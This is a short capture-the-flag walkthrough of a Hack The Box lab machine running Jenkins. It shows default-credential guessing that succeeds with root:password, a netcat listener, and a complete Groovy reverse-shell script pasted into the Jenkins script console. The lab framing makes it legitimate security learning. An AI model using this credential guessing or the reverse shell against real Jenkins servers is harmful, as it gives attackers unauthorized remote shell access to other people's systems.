Seems like it only has one open HTTP server at `8080`

Key findings: 
- HTTP on port 8080

## Web Access

Accessing `http://pennyworth.htb:8080` ( I added target IP in `/etc/hosts`) led me to a login page for `Jenkins`

Jenkins seems to be an [open-soucred CI/CD](https://www.jenkins.io/) ? I could not find any information on default credential for this product. Given the limited intel, I'm assuming the credential is something basic such as
- `root:password`
- `root:admin`
- `admin:admin`

Turns out `root:password` was the correct combination.

Now, Jenkins is a CI/CD tool, so it's likely that there is a way to upload a script to the tool and somehow get shell. A some research led me to [this website](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6), which has detailed steps on getting shell using the script console.

## Getting Shell

Following the website guide, I have to paste the shell command to the script console while listening to a designated port. For this case, I used port 4444 as a listener..

```bash
$nc -lvnp 4444
```

```groovy
String host="{my localhost port}";
int port=4444;
String cmd="bash";
Process p=new

ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

And this gave me shell acces!! 

```bash
$ nc -lvnp 4444
